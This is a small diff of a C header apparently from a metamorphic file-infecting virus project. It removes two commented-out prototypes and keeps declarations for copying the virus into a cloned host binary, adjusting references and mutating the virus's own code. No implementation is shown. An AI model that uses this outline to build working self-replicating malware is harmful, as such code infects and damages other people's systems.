@@ -63,8 +63,6 @@ bool		adjust_references(struct safe_ptr ref, size_t shift_amount, size_t end_of_
 bool		copy_client_to_clone(struct safe_ptr clone_ref, struct safe_ptr original_ref, \
 			size_t end_last_sect, size_t shift_amount, size_t original_size);
 bool		copy_virus_to_clone(struct safe_ptr clone_ref, const struct entry *original_entry, struct virus_header *vhdr);
-// bool		adapt_virus_call_in_loader(struct safe_ptr clone_ref, size_t loader_entry_off, int virus_func_shift);
-// bool		metamorph_self(struct safe_ptr clone, size_t *virus_size, int *virus_func_shift, size_t loader_off, uint64_t seed);
 bool		metamorph_self(struct safe_ptr clone, size_t *virus_size, size_t loader_off, uint64_t seed);
 bool		generate_seed(uint64_t *seed, struct safe_ptr original_ref);
 
